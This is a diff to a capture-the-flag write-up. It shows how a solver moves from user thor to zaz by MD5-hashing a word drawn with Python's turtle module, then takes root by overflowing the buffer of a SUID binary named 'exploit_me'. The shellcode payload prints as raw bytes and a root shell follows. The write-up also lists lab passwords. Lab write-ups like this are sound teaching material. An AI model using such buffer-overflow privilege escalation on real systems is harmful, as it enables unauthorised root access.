@@ -218,6 +218,37 @@ The password is : `Publicspeakingisveryeasy.126241207201b2149opekmq426135`
 
 **thor -> zaz**
 
-Used python module `turtle` with the instructions described in `turtle` file, and got a drawing of the word `SLASH`
+Used [turtle-solve](scripts/turtle-solve.py) which uses a python module named `turtle` and got a drawing of the word `SLASH`
 
-[turtle-solve](scripts/turtle-solve.py)
+```
+...
+Can you digest the message? :)
+```
+The last line in `turtle` gave a clue on how to get the password, digesting a text means in cryptography `hashing` it
+
+Used `MD5` hashing algorithm and got a valid password
+
+```
+$ echo -n SLASH | md5sum
+646da671ca01bb5d84dbb5fb2238dc8e  -
+```
+
+**zaz -> root**
+
+`exploit_me` is being executed as `root` because it has `SUID` bit set. This binary takes an argument and print it to stdout
+
+```
+$ ./exploit_me HELLO1337
+HELLO1337
+```
+
+Used [shellcode.py](scripts/shellcode.py) to generate a payload that will exploit a buffer overflow vulnerability and gave us a root shell.
+
+```
+$ ./exploit_me $(python shellcode.py)
+���������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin��PS���
+                    ����
+# whoami
+root
+# 
+```
